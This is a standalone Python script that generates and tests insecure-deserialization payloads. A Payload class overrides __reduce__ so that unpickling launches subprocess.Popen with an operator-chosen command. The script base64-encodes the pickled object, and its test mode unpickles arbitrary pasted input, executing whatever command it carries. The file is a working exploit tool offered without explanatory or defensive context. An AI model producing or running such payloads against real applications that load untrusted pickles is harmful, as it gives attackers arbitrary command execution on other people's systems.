import pickle
import subprocess
import base64

class Payload:
    def __reduce__(self):
        user_cmd = input("Enter the command you want to execute: ").strip()
        cmd = user_cmd.split(' ')
        return (subprocess.Popen, (cmd,))

def create_payload():
    serialized_payload = pickle.dumps(Payload())
    encoded_payload = base64.b64encode(serialized_payload).decode()
    print(f"Base64 Encoded Payload: {encoded_payload}")

def test_payload():
    p = input("Enter the base64-encoded payload: ")
    data = base64.b64decode(p)
    print("Attempting to deserialize payload...")
    try:
        pickle.loads(data)
    except Exception as e:
        print(f"Error deserializing payload: {e}")

def main():
    choice = input("Do you want to (create) a payload or (test) a payload? Enter 'create' or 'test': ").strip().lower()
    if choice == 'create':
        create_payload()
    elif choice == 'test':
        test_payload()
    else:
        print("Invalid choice. Please enter 'create' or 'test'.")

if __name__ == "__main__":
    main()
